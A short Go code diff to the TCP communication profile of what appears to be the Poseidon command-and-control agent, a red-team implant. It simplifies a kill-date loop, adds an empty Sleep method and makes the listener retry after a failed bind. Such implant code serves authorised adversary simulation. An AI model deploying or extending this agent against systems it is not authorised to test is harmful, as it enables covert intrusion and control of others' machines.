@@ -83,13 +83,16 @@ func init() {
 	RegisterAvailableC2Profile(&profile)
 }
 func (c *C2PoseidonTCP) CheckForKillDate() {
-	for true {
+	for {
 		time.Sleep(time.Duration(10) * time.Second)
 		today := time.Now()
 		if today.After(c.Killdate) {
 			os.Exit(1)
 		}
 	}
+}
+func (c *C2PoseidonTCP) Sleep() {
+
 }
 func (c *C2PoseidonTCP) Start() {
 	// start listening
@@ -107,6 +110,7 @@ func (c *C2PoseidonTCP) Start() {
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("Failed to bind: %v\n", err))
 			time.Sleep(1 * time.Second)
+			continue
 		}
 		utils.PrintDebug(fmt.Sprintf("Listening on %s\n", c.Port))
 		if c.ShouldStop {
